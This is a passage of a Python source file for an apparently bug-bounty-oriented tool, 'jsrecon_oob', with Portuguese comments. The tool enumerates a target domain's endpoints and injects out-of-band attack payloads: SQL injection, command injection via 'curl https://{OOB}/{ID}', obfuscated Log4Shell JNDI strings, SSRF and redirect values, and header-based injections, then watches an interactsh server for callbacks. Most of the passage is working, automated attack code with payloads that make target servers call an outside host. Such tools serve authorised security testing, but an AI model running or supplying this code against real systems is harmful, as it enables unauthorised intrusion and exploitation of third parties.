        "'; EXEC master..xp_dirtree '\\\\{OOB}\\{ID}';-- -",
        "' AND 1=(SELECT UTL_HTTP.REQUEST('https://{OOB}/{ID}') FROM dual)-- -",
    ],
    "rce": [
        "; curl https://{OOB}/{ID} #",
        "$(curl https://{OOB}/{ID})",
        "`curl https://{OOB}/{ID}`",
    ],
    "redirect": [
        "https://{OOB}/{ID}",
        "//https://{OOB}/{ID}",
        "@{OOB}/{ID}",
    ],
    "log4shell": [
        "${{jndi:ldap://{OOB}/{ID}}}",
        "${{j${{::-n}}di:ldap://{OOB}/{ID}}}",
        "${{jndi:dns://{OOB}/{ID}}}",
    ],
}

# Headers para injeção (SSRF via header)
OOB_HEADERS: list[tuple[str, str]] = [
    ("X-Forwarded-For",           "https://{OOB}/{ID}"),
    ("X-Real-IP",                 "{OOB}"),
    ("Referer",                   "https://{OOB}/{ID}"),
    ("X-Forwarded-Host",          "{OOB}"),
    ("X-Original-URL",            "https://{OOB}/{ID}"),
    ("X-Custom-IP-Authorization", "{OOB}"),
    ("X-Originating-IP",          "{OOB}"),
    ("True-Client-IP",            "{OOB}"),
    ("CF-Connecting-IP",          "{OOB}"),
    ("X-Host",                    "{OOB}"),
    ("Forwarded",                 "for={OOB};by={OOB}"),
    # Log4Shell via headers comuns
    ("User-Agent",                "${{jndi:ldap://{OOB}/{ID}}}"),
    ("X-Api-Version",             "${{jndi:ldap://{OOB}/{ID}}}"),
]


def _choose_payloads(method: str, param_name: str, query_params: str) -> list[tuple[str, str]]:
    """
    Escolhe payloads relevantes para o endpoint baseado no método e nome do param.
    Retorna lista de (category, payload_template).
    """
    chosen = []
    pm = param_name.lower()

    # Params que sugerem SSRF
    if any(k in pm for k in ("url", "uri", "endpoint", "host", "callback",
                               "redirect", "next", "return", "dest", "target",
                               "link", "src", "source", "domain", "addr", "address")):
        chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"]]
        chosen += [("redirect", p) for p in OOB_PAYLOADS["redirect"]]

    # Params que sugerem SQLi
    if any(k in pm for k in ("id", "user", "name", "search", "query", "q",
                               "filter", "order", "sort", "where", "key",
                               "email", "login", "pass")):
        chosen += [("sqli", p) for p in OOB_PAYLOADS["sqli"]]

    # Params que sugerem XSS
    if any(k in pm for k in ("q", "search", "s", "query", "input", "text",
                               "msg", "message", "content", "body", "comment",
                               "title", "name", "value", "data")):
        chosen += [("xss", p) for p in OOB_PAYLOADS["xss"]]

    # Params que sugerem SSTI
    if any(k in pm for k in ("template", "theme", "view", "layout", "page",
                               "render", "format")):
        chosen += [("ssti", p) for p in OOB_PAYLOADS["ssti"]]

    # POST/PUT/PATCH sempre recebe SSRF + Log4Shell
    if method in ("POST", "PUT", "PATCH"):
        chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"]]
        chosen += [("log4shell", p) for p in OOB_PAYLOADS["log4shell"]]

    # Fallback: qualquer param recebe SSRF básico
    if not chosen:
        chosen += [("ssrf", p) for p in OOB_PAYLOADS["ssrf"][:2]]
        chosen += [("xss",  p) for p in OOB_PAYLOADS["xss"][:1]]

    # Log4Shell em todos os endpoints
    chosen += [("log4shell", p) for p in OOB_PAYLOADS["log4shell"]]

    return chosen


def _inject_param(url: str, param: str, value: str) -> str:
    try:
        parsed = urllib.parse.urlparse(url)
        qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [value]
        new_qs = urllib.parse.urlencode(qs, doseq=True)
        return urllib.parse.urlunparse(parsed._replace(query=new_qs))
    except Exception:
        return url


def _send_request(url: str, method: str, headers: dict,
                  body: dict | None, timeout: int = 8) -> str:
    """Envia requisição e retorna código HTTP."""
    try:
        fn = getattr(requests, method.lower(), requests.get)
        kwargs: dict = {
            "headers":         headers,
            "timeout":         timeout,
            "verify":          False,
            "allow_redirects": False,
        }
        if body and method in ("POST", "PUT", "PATCH"):
            kwargs["json"] = body
        r = fn(url, **kwargs)
        return str(r.status_code)
    except requests.exceptions.Timeout:
        return "TMO"
    except requests.exceptions.ConnectionError:
        return "ERR"
    except Exception:
        return "???"


def _build_curl_cmd(url: str, method: str, headers: dict,
                    body: dict | None = None) -> str:
    """Monta curl equivalente para reprodução."""
    parts = [f"curl -sk -X {method}"]
    for k, v in headers.items():
        parts.append(f"-H '{k}: {v}'")
    if body:
        parts.append(f"-H 'Content-Type: application/json'")
        parts.append(f"-d '{json.dumps(body)}'")
    parts.append(f"'{url}'")
    return " ".join(parts)


def inject_endpoint(ep: dict, oob_host: str, plog: PayloadLog,
                    delay: float, lg: logging.Logger) -> int:
    """
    Injeta payloads OOB em um endpoint.
    Retorna número de payloads enviados.
    """
    method   = ep["method"].upper()
    base_url = ep["absolute_url"]
    sent     = 0

    # ── Normaliza método para requests ────────────────────────────────────
    # ANY/DYNAMIC: infere pelo path e label, não assume GET por padrão
    #   /api/*, /submit-*, /create-*, /send-* → POST
    #   Tem body_params → POST
    #   Tem query_params ou path com ? → GET
    #   Fallback → tenta GET e POST
    if method in ("GET", "POST", "PUT", "PATCH", "DELETE"):
        req_method = method
    else:
        label      = ep.get("label", "").lower()
        path_lower = base_url.lower()
        has_body   = bool(ep.get("body_params"))
        has_qs     = "?" in base_url

        if has_body:
            req_method = "POST"
        elif "post" in label or "graphql" in label:
            req_method = "POST"
        elif re.search(r'/(?:submit|create|send|add|new|register|login|auth|upload|update)', path_lower):
            req_method = "POST"
        elif has_qs:
            req_method = "GET"
        else:
            # Sem pistas — tenta POST (APIs sem QS geralmente recebem body)
            req_method = "POST"

    # Indica ao log qual método foi inferido
    method_display = req_method if method in ("GET","POST","PUT","PATCH","DELETE") \
                     else f"{req_method}(≈{method})"

    # ── 1. Injeção nos query params / body ────────────────────────────────
    params_from_qs = []
    if "?" in base_url:
        qs = urllib.parse.urlparse(base_url).query
        params_from_qs = list(urllib.parse.parse_qs(qs, keep_blank_values=True).keys())

    body_params = ep.get("body_params", [])

    # Params de QS → injeta na URL; body params → injeta no JSON body
    # Se não tiver nenhum, usa "q" como placeholder para tentar
    all_params = list(dict.fromkeys(params_from_qs + body_params)) or ["q"]

    for param in all_params:
        payloads = _choose_payloads(req_method, param, ep.get("query_params", ""))
        for category, tpl in payloads:
            uid     = unique_id(category, param)
            payload = tpl.replace("{OOB}", oob_host).replace("{ID}", uid)
            sent_at = datetime.now(timezone.utc).strftime("%H:%M:%S")

            # GET → payload na URL; POST/PUT/PATCH → payload no body
            if req_method == "GET" or param in params_from_qs:
                injected_url = _inject_param(base_url, param, payload)
                body_data    = None
            else:
                # Param é body param — manda via JSON
                injected_url = base_url
                body_data    = {
                    p: (payload if p == param else f"<{p}>")
                    for p in (body_params or [param])
                }

            headers = {
                "User-Agent":   "Mozilla/5.0 (compatible; jsrecon_oob/1.0)",
                "Accept":       "application/json, */*",
            }

            plog.record(uid, base_url, param, category, payload)
            code = _send_request(injected_url, req_method, headers, body_data)

            clog(lg,
                 f"  {sent_at} [{uid[:32]}] "
                 f"{param:15} {category:10} "
                 f"[{method_display}] HTTP {code} → {base_url[:50]}",
                 C.GREEN if code in ("200","201","301","302") else C.DIM)
            sent += 1
            time.sleep(delay)

    # ── 2. Injeção nos headers HTTP ───────────────────────────────────────
    # Headers são enviados com o método correto do endpoint
    # POST endpoints continuam sendo POST, GET continuam GET
    for hdr_name, hdr_tpl in OOB_HEADERS:
        uid      = unique_id("hdr", re.sub(r'[^a-z0-9]', '', hdr_name.lower())[:6])
        payload  = hdr_tpl.replace("{OOB}", oob_host).replace("{ID}", uid)
        sent_at  = datetime.now(timezone.utc).strftime("%H:%M:%S")
        category = "header_ssrf"

        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; jsrecon_oob/1.0)",
            "Accept":     "application/json, */*",
            hdr_name:     payload,
        }

        # body_data para headers: POST mantém body mínimo para não virar 400
        hdr_body = ({"_": ""} if req_method in ("POST", "PUT", "PATCH")
                    and body_params
                    else None)

        plog.record(uid, base_url, hdr_name, category, payload)
        # Bug fix: body era argumento posicional obrigatório, agora sempre passado
        code = _send_request(base_url, req_method, headers, hdr_body)

        clog(lg,
             f"  {sent_at} [{uid[:32]}] "
             f"{hdr_name:25} header      "
             f"[{method_display}] HTTP {code} → {base_url[:35]}",
             C.DIM)
        sent += 1
        time.sleep(delay * 0.3)

    return sent


def phase_inject(endpoints: list[dict], oob_host: str, out: Path,
                 plog: PayloadLog, delay: float, threads: int,
                 lg: logging.Logger) -> int:
    clog(lg, "\n━━━ FASE OOB: Injeção de Payloads ━━━", C.BLUE + C.BOLD)

    # Descarta DELETE
    safe_eps = [ep for ep in endpoints
                if ep["method"].upper() not in ("DELETE",)]
    clog(lg, f"  Endpoints para injeção: {len(safe_eps)} "
         f"({len(endpoints)-len(safe_eps)} DELETE descartados)", C.CYAN)

    total  = 0
    errors = 0

    def worker(ep):
        return inject_endpoint(ep, oob_host, plog, delay, lg)

    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(worker, ep): ep for ep in safe_eps}
        for fut in as_completed(futs):
            try:
                total += fut.result()
            except Exception as e:
                errors += 1
                lg.error("Inject worker error: %s", e)

    clog(lg, f"\n  Payloads enviados: {total} | Erros: {errors}",
         C.GREEN + C.BOLD)
    return total


# ─────────────────────────────────────────────────────────────────────────────
# FASE 3: MONITOR INTERACTSH
# ─────────────────────────────────────────────────────────────────────────────

def _parse_interactsh_ts(ts_str: str) -> Optional[float]:
    if not ts_str:
        return None
    try:
        ts_norm = re.sub(r'(\.\d{6})\d+(Z?)$', r'\1\2', ts_str)
        ts_norm = ts_norm.replace("Z", "+00:00")
        return datetime.fromisoformat(ts_norm).timestamp()
    except Exception:
        return None


def _process_hit(data: dict, plog: PayloadLog,
                 hits: list, hits_file: Path, lg: logging.Logger):
    raw_id      = data.get("full-id", data.get("unique-id", ""))
    protocol    = data.get("protocol", "unknown").upper()
    remote_addr = data.get("remote-address", "?")
    raw_request = data.get("raw-request", "")
    q_type      = data.get("q-type", "")
    hit_ts_str  = data.get("timestamp", "")
    hit_ts_unix = _parse_interactsh_ts(hit_ts_str) or time.time()
    received_at = hit_ts_str or datetime.now(timezone.utc).isoformat()
    proto_label = f"{protocol}/{q_type}" if q_type else protocol

    clog(lg, f"\n{'━'*60}", C.RED + C.BOLD)
    clog(lg, f"  🎯  OOB HIT!", C.RED + C.BOLD)
    clog(lg, f"  Protocolo  : {proto_label}",  C.YELLOW)
    clog(lg, f"  Remote IP  : {remote_addr}",  C.YELLOW)
    clog(lg, f"  Full-ID    : {raw_id}",        C.YELLOW)
    clog(lg, f"  Timestamp  : {received_at}",   C.YELLOW)

    if raw_request:
        first = raw_request.split("\n")[0].strip()
        if first:
            clog(lg, f"  Request    : {first[:120]}", C.YELLOW)

    matched   = plog.find_fuzzy(raw_id)
    delay_str = "?"
    if matched:
        delay_s = hit_ts_unix - (matched["unix_ts"] / 1000.0)
        if delay_s < 0:
            delay_str = f"~{abs(delay_s):.1f}s (clock skew?)"
        elif delay_s > 3600:
            delay_str = f"{delay_s/3600:.1f}h"
        elif delay_s > 60:
            delay_str = f"{delay_s/60:.1f}min"
        else:
            delay_str = f"{delay_s:.1f}s"

        clog(lg, f"\n  ✅ Payload correlacionado!", C.GREEN + C.BOLD)
        clog(lg, f"  Categoria  : {matched['category']}",   C.GREEN)
        clog(lg, f"  URL        : {matched['url']}",         C.GREEN)
        clog(lg, f"  Parâmetro  : {matched['param']}",       C.GREEN)
        clog(lg, f"  JS fonte   : ", C.GREEN)   # preenchido abaixo via endpoint lookup
        clog(lg, f"  Enviado em : {matched['timestamp']}",   C.GREEN)
        clog(lg, f"  ⏱  Delay   : {delay_str} após envio", C.GREEN + C.BOLD)
        clog(lg, f"  Payload    : {matched['payload'][:120]}", C.GREEN)
    else:
        clog(lg, "  ⚠  UID não encontrado no payload_log.", C.YELLOW, "warning")
        clog(lg, f"     grep '{raw_id[:24]}' {hits_file.parent}/payload_log.jsonl",
             C.DIM)

    hit = {
        "received_at":   received_at,
        "hit_ts_unix":   hit_ts_unix,
        "protocol":      proto_label,
        "remote_addr":   remote_addr,
        "raw_id":        raw_id,
        "delay_str":     delay_str,
        "raw_request":   raw_request[:500],
        "matched_entry": matched,
    }
    hits.append(hit)
    with open(hits_file, "a", encoding="utf-8") as f:
        f.write(json.dumps(hit) + "\n")
    clog(lg, f"{'━'*60}\n", C.RED + C.BOLD)


def phase_monitor(oob_host: str, plog: PayloadLog, out: Path,
                  duration: int, lg: logging.Logger,
                  parallel: bool = False):
    if parallel:
        t = threading.Thread(
            target=_monitor_loop,
            args=(oob_host, plog, out, duration, lg),
            daemon=True, name="monitor",
        )
        t.start()
        return t
    _monitor_loop(oob_host, plog, out, duration, lg)
    return None


def _monitor_loop(oob_host: str, plog: PayloadLog, out: Path,
                  duration: int, lg: logging.Logger):
    clog(lg, "\n━━━ Monitor OOB ━━━", C.BLUE + C.BOLD)
    clog(lg, f"  Host  : {oob_host}", C.CYAN)
    clog(lg, f"  Tempo : {duration}s  |  Ctrl+C para encerrar", C.DIM)

    hits_file    = out / "oob_hits.jsonl"
    summary_file = out / "oob_hits_summary.txt"

    if not tool_ok("interactsh-client"):
        clog(lg, "  interactsh-client não encontrado.", C.YELLOW, "warning")
        clog(lg, f"  Execute manualmente:", C.DIM)
        clog(lg, f"    interactsh-client -json | tee {out}/interactsh_raw.jsonl", C.DIM)
        clog(lg, f"  Cruze hits com: grep <uid> {out}/payload_log.jsonl", C.DIM)
        return

    cmd = ["interactsh-client", "-json", "-poll-interval", "5"]
    if not re.search(r"oast\.(fun|me|live|online)", oob_host):
        cmd += ["-server", oob_host]

    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            text=True, bufsize=1)

    def drain_stderr():
        for raw in proc.stderr:
            raw = raw.strip()
            if not raw:
                continue
            low = raw.lower()
            if any(k in low for k in ("error", "failed", "invalid")):
                clog(lg, f"  ⚠ {raw}", C.YELLOW, "warning")
            else:
                lg.debug("  [interactsh] %s", raw)
    threading.Thread(target=drain_stderr, daemon=True).start()

    def _countdown():
        remaining = duration
        while remaining > 0 and proc.poll() is None:
            time.sleep(10)
            remaining -= 10
            if remaining > 0:
                clog(lg, f"  ⏱  {remaining}s restantes...", C.DIM)
    threading.Thread(target=_countdown, daemon=True).start()

    hits: list[dict] = []
    start = time.time()

    try:
        while time.time() - start < duration:
            line = proc.stdout.readline()
            if not line:
                if proc.poll() is not None:
                    clog(lg, "  interactsh-client encerrou.", C.RED, "error")
                    break
                time.sleep(0.3)
                continue
            line = line.strip()
            if not line:
                continue
            if line.startswith("["):
                low = line.lower()
                if any(k in low for k in ("error", "failed")):
                    clog(lg, f"  ⚠ {line}", C.YELLOW, "warning")
                else:
                    lg.debug("  %s", line)
                continue
            try:
                data = json.loads(line)
            except json.JSONDecodeError:
                lg.debug("  [stdout não-JSON] %s", line[:100])
                continue
            if "protocol" not in data and "unique-id" not in data:
                continue
            _process_hit(data, plog, hits, hits_file, lg)

    except KeyboardInterrupt:
        clog(lg, "\n  Monitor encerrado.", C.YELLOW)
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=3)
        except subprocess.TimeoutExpired:
            proc.kill()

    _write_summary(hits, plog, summary_file, lg)


def _write_summary(hits: list, plog: PayloadLog,
                   summary_file: Path, lg: logging.Logger):
    total = len(plog.entries)
    lines = [
        "=" * 70,
        "  JSRECON OOB — SUMÁRIO DE HITS",
        f"  Gerado em : {datetime.now(timezone.utc).isoformat()}",
        "=" * 70,
        f"  Payloads enviados : {total}",
        f"  OOB hits          : {len(hits)}",
        f"  Taxa de hit       : {len(hits)/max(total,1)*100:.1f}%",
        "",
    ]
    by_cat: dict[str, list] = {}
    for h in hits:
        m   = h.get("matched_entry") or {}
        cat = m.get("category", "unknown")
        by_cat.setdefault(cat, []).append(h)

    if by_cat:
        lines.append("  ─── HITS POR CATEGORIA ───")
        for cat, ch in sorted(by_cat.items()):
            lines.append(f"  {cat.upper():20} {len(ch)} hit(s)")
        lines.append("")

    if hits:
        lines.append("  ─── DETALHES ───")
        for i, h in enumerate(hits, 1):
            m = h.get("matched_entry") or {}
            lines += [
                f"\n  [Hit #{i}]",
                f"    Protocolo  : {h['protocol']}",
                f"    Remote IP  : {h['remote_addr']}",
                f"    Recebido   : {h['received_at']}",
                f"    Delay      : {h.get('delay_str','?')} após envio",
                f"    Categoria  : {m.get('category','?')}",
                f"    URL        : {m.get('url','?')}",
                f"    Parâmetro  : {m.get('param','?')}",
                f"    Payload    : {m.get('payload','?')}",
            ]
    else:
        lines.append("  Nenhum hit registrado. Dica: use --monitor-time maior para blind DNS.")

    summary_file.write_text("\n".join(lines), encoding="utf-8")
    clog(lg, f"\n  Sumário: {summary_file}", C.GREEN)


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="jsrecon_oob",
        description="JS Recon + OOB Injection — Bug Bounty",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  # Completo
  python3 jsrecon_oob.py target.com -o abc123.oast.fun

  # Sem browser (mais rápido)
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-live

  # Já tem recon — só roda injeção
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --skip-recon

  # Só recon, sem OOB
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --no-oob

  # Monitor longo (blind SQLi via DNS pode demorar)
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --monitor-time 1800

  # Com proxy (Burp Suite)
  python3 jsrecon_oob.py target.com -o abc123.oast.fun --proxy http://127.0.0.1:8080

Variáveis de ambiente:
  CHAOS_KEY      chave para chaos (ProjectDiscovery)
  GITHUB_TOKEN   token para github-subdomains
        """
    )
    p.add_argument("domain",         help="Domínio alvo (ex: target.com.br)")
    p.add_argument("-o", "--oob",    required=False, default="",
                   help="Host interactsh (ex: abc123.oast.fun)")
    p.add_argument("--skip-recon",   action="store_true",
                   help="Pula recon (usa endpoints.jsonl existente)")
    p.add_argument("--no-nmap",      action="store_true", help="Pula nmap")
    p.add_argument("--no-subs",      action="store_true", help="Pula enum de subdomínios")
    p.add_argument("--no-live",      action="store_true", help="Pula Playwright")
    p.add_argument("--no-oob",       action="store_true", help="Pula injeção OOB")
    p.add_argument("--no-cache",     action="store_true", help="Ignora cache de JS")
    p.add_argument("--no-headless",  action="store_true", help="Browser visível (debug)")
    p.add_argument("--poll",         action="store_true", help="Só monitora OOB")
    p.add_argument("--monitor-time", type=int,   default=300, metavar="S",
                   help="Duração do monitor em segundos (default: 300)")
    p.add_argument("--delay",        type=float, default=0.3,  metavar="S",
                   help="Delay entre requisições (default: 0.3)")
    p.add_argument("--threads",      type=int,   default=5,    metavar="N",
                   help="Threads de injeção (default: 5)")
    p.add_argument("--workers",      type=int,   default=20,   metavar="N",
                   help="Workers de análise JS (default: 20)")
    p.add_argument("--timeout",      type=int,   default=10,   metavar="S",
                   help="Timeout HTTP (default: 10)")
    p.add_argument("--proxy",        default="",  metavar="URL",
                   help="Proxy HTTP (ex: http://127.0.0.1:8080)")
    p.add_argument("--output-dir",   default="",  metavar="DIR",
                   help="Diretório de saída (default: jsrecon_oob_<domain>)")
    return p.parse_args()


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main() -> None:
    args = parse_args()

    domain = args.domain.strip()
    for pfx in ("https://", "http://"):
        if domain.startswith(pfx):
            domain = domain[len(pfx):]
    domain = domain.rstrip("/")

    if not re.match(r'^[a-zA-Z0-9.\-]+$', domain):
        print(f"Domínio inválido: {domain}")
        sys.exit(1)

    out = Path(args.output_dir or f"jsrecon_oob_{domain.replace('.','_')}")
    out.mkdir(parents=True, exist_ok=True)

    lg  = setup_logging(out / "jsrecon_oob.log")
    cfg = {
        "domain":    domain,
        "timeout":   args.timeout,
        "workers":   args.workers,
        "no_cache":  args.no_cache,
        "no_live":   args.no_live,
        "headless":  not args.no_headless,
    }

    clog(lg, f"\n{'═'*66}", C.CYAN + C.BOLD)
    clog(lg, f"  jsrecon_oob  —  alvo: {domain}", C.CYAN + C.BOLD)
    if args.oob:
        clog(lg, f"  OOB host   : {args.oob}", C.CYAN)
    clog(lg, f"  Saída      : {out}/", C.CYAN)
    clog(lg, f"{'═'*66}\n", C.CYAN + C.BOLD)

    plog = PayloadLog(out / "payload_log.jsonl")

    # ── Modo: só poll ────────────────────────────────────────────────────────
    if args.poll:
        if not args.oob:
            print("--poll requer -o <oob_host>")
            sys.exit(1)
        plog.load_existing()
        clog(lg, f"  Payloads carregados do log anterior: {len(plog.entries)}", C.DIM)
        phase_monitor(args.oob, plog, out, args.monitor_time, lg)
        return

    # ── Fase 1: Recon JS ─────────────────────────────────────────────────────
    endpoints: list[dict] = []

    if args.skip_recon:
        # Recarrega endpoints de sessão anterior
        ep_jsonl = out / "endpoints.jsonl"
        if not ep_jsonl.exists():
            clog(lg, "endpoints.jsonl não encontrado. Rode sem --skip-recon.", C.RED, "error")
            sys.exit(1)
        for line in ep_jsonl.read_text().splitlines():
            try:
                endpoints.append(json.loads(line))
            except Exception:
                pass
        clog(lg, f"  Recon pulado. {len(endpoints)} endpoints carregados.", C.YELLOW)
        confirmed_hosts: set[str] = set()   # não disponível sem recon
    else:
        # 1-A: Subdomínios
        subs = {domain} if args.no_subs else enum_subdomains(domain, out, lg)

        # 1-B: Nmap
        open_ports = ({s: [80, 443] for s in subs} if args.no_nmap
                      else nmap_scan(subs, out, lg))

        # 1-C: httpx
        alive_urls, confirmed_hosts = httpx_probe(open_ports, out, lg)
        if not alive_urls:
            clog(lg, "Nenhum host vivo. Encerrando.", C.RED, "error")
            sys.exit(0)

        # 1-D: Coleta de JS
        js_from_tools = collect_js_tools(domain, alive_urls, lg)

        # 1-E: Playwright
        js_from_browser: set[str] = set()
        if not args.no_live and HAS_PLAYWRIGHT:
            clog(lg, "\n━━━ Playwright ━━━", C.BLUE + C.BOLD)
            seen_hosts: set[str] = set()
            targets = []
            for url in alive_urls:
                parsed = urlparse(url)
                key = parsed.netloc
                if key not in seen_hosts:
                    seen_hosts.add(key)
                    targets.append(f"{parsed.scheme}://{parsed.netloc}")
            js_from_browser = asyncio.run(
                playwright_all(targets, not args.no_headless, lg)
            )
        elif not HAS_PLAYWRIGHT:
            clog(lg, "  Playwright não instalado — pulando coleta via browser.", C.YELLOW)

        # Une e filtra: apenas JS do target
        all_js_raw = js_from_tools | js_from_browser
        all_js_raw = {u for u in all_js_raw if not u.endswith(".js.map")}

        # Filtro de domínio no JS também
        root = domain.lower()
        js_filtered: set[str] = set()
        for url in all_js_raw:
            host = urlparse(url).netloc.lower().split(":")[0]
            if host == root or host.endswith(f".{root}") or host in confirmed_hosts:
                js_filtered.add(url)

        js_discarded = len(all_js_raw) - len(js_filtered)
        _write(out / "js_urls.txt", sorted(js_filtered), lg)
        clog(lg, f"\n  JS do target: {len(js_filtered)} "
             f"({js_discarded} de domínios externos descartados)", C.GREEN + C.BOLD)

        # Análise de JS → extrai endpoints
        endpoints = analyze_all_js(
            sorted(js_filtered), domain, confirmed_hosts, out, cfg, lg
        )

        # Salva agrupado por método
        save_endpoints_by_method(endpoints, out, lg)

    # ── Fase 2: OOB ──────────────────────────────────────────────────────────
    if args.no_oob or not args.oob:
        if not args.oob:
            clog(lg, "\n  OOB pulado (sem -o <oob_host>).", C.YELLOW)
        else:
            clog(lg, "\n  OOB pulado (--no-oob).", C.YELLOW)
    elif endpoints:
        # Monitor inicia ANTES da injeção para capturar hits em tempo real
        monitor_thread = phase_monitor(
            args.oob, plog, out, args.monitor_time, lg, parallel=True
        )
        clog(lg, "  Monitor OOB iniciado em background.", C.DIM)

        phase_inject(endpoints, args.oob, out, plog,
                     delay=args.delay, threads=args.threads, lg=lg)

        if monitor_thread and monitor_thread.is_alive():
            clog(lg, f"\n  Injeção concluída. Aguardando monitor ({args.monitor_time}s)...",
                 C.CYAN)
            monitor_thread.join(timeout=args.monitor_time)
    else:
        clog(lg, "\n  Nenhum endpoint para injeção.", C.YELLOW)

    clog(lg, f"\n{'═'*66}", C.GREEN)
    clog(lg, f"  Concluído. Resultados em: {out}/", C.GREEN + C.BOLD)
    clog(lg, f"{'═'*66}\n", C.GREEN)


if __name__ == "__main__":
    import signal
    def _sig(s, f):
        print("\n  Interrompido.")
        sys.exit(0)
    signal.signal(signal.SIGINT, _sig)
    main()
